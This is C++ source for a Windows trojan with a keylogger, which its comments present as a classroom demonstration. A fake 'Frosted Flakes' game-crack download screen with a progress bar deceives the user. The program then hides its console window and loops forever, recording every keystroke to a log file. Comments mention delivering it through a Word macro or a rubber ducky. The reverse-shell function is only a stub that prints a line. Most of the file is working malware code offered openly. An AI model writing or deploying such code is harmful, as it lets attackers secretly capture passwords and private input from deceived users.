/*
By: Eduardo Corazon
Date: 11/25/2022
Decription: This is a simple RAT with keylogging functionality written in C++,
            it's to be used exclusively for demonstration purposes

Refferences: https://stackoverflow.com/questions/21582448/creating-a-loading-animation
             https://www.youtube.com/watch?v=6f1GUyY9TYE
             https://github.com/izenynn/c-reverse-shell

Warning: I am NOT responsible for ANY misuse of this product
         PLEASE DO NOT USE THIS FOR NEFARIOUS / ILLEGAL PURPOSES
*/


//Libraries to use
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <bits/stdc++.h>


//Define namespace & avoid errors
//Yes ik it's bad practice
using namespace std; 



//The sections below define the functions for their respective use
//using pascal case

/*################ TROJAN #####################*/
//For the "legitamate software" aspect to disgues our malware we will make Kellog appear to be a game cracker
//This is becuase it's very unlikely any user would actually run an .exe file if they don't know what it is
//NOTE* we could run this malware from a word doc macro or deliver it via a rubber ducky
//But since we are doing an in-class demonstration we will likely not show that.

void Trojan(){
    //Banner
    printf("___________                      __             .______________.__          __                    \n");
    printf("\\_   _____/______  ____  _______/  |_  ____   __| _/\\_   _____/|  | _____  |  | __ ____   ______  \n");
    printf(" |    __) \\_  __ \\/  _ \\/  ___/\\   __\\/ __ \\ / __ |  |    __)  |  | \\__  \\ |  |/ // __ \\ /  ___/  \n");
    printf(" |     \\   |  | \\(  <_> )___ \\  |  | \\  ___// /_/ |  |     \\   |  |__/ __ \\|    <\\  ___/ \\___ \\  \n");
    printf(" \\___  /   |__|   \\____/____  > |__|  \\___  >____ |  \\___  /   |____(____  /__|_ \\\\___  >____  >  \n");
    printf("     \\/                     \\/            \\/     \\/      \\/              \\/     \\/    \\/     \\/  \n");

    printf("\n");
    printf("Now downloading crack for the secret game 'Frosted Flakes' \nPlease be patient... \n");
    
    //Fake a Progress bar
    #define PROGRESS_BAR_SIZE 40

    //since we can't have a function inside a function in c++, we use lambdas & pass everything in the capture list with &
    auto print_n_chars= [&](int n, int c) {
        while (n-- > 0) putchar(c);
    };

    auto display_progress_bar = [&](int p) {
        putchar('\r');
        putchar('[');
        print_n_chars(PROGRESS_BAR_SIZE * p / 100, '#');
        print_n_chars(PROGRESS_BAR_SIZE - PROGRESS_BAR_SIZE * p / 100, ' ');
        putchar(']');
    };

    int p;
    for (p = 0; p <= 100; ++p) {
        display_progress_bar(p);
        Sleep(50);
    }
    //Indicate it's done and press any key to close
    printf("\n");
    printf("\nDone! \nThis Terminal will automatically close in a couple of seconds!\nGive it a minute to finalize the crack ... ");
    Sleep(500);
}


/*################ KEYLOGGER #####################*/
void Keylogger(){
    #define LOG_FILE "keylogger.txt" //create log file

    auto saveData = [](std::string data){
        fstream logFile;

        logFile.open(LOG_FILE, std::ios::app); //open the log file and append data (std::ios::app)
        logFile << data; //writes data into the logfile
        logFile.close(); //close the file
    };


    while (true){ //While(true) creates an infinite loop that won't stop until it's explicitly broken
        //this is the common code in all the keyloggers written in C
        for(int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767){
                //once we get the key input we should verify if it's a special character
                saveData(std::string(1, (char)std::tolower(key)));
            }
        }
    }

    
}
/*################ REVERSE SHELL #####################*/
void RevShell(){
    printf("REVERSE SHELL \n");
}
/*########################################### MAIN FUNCTION #####################################################*/
// define the main function signature
// **look at this when rev engineering
int main (int argc, char *argv[]){ 
     //call our functions
     Trojan();
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); //This hides the terminal windows when run as administrator
     Keylogger();
     

     
}
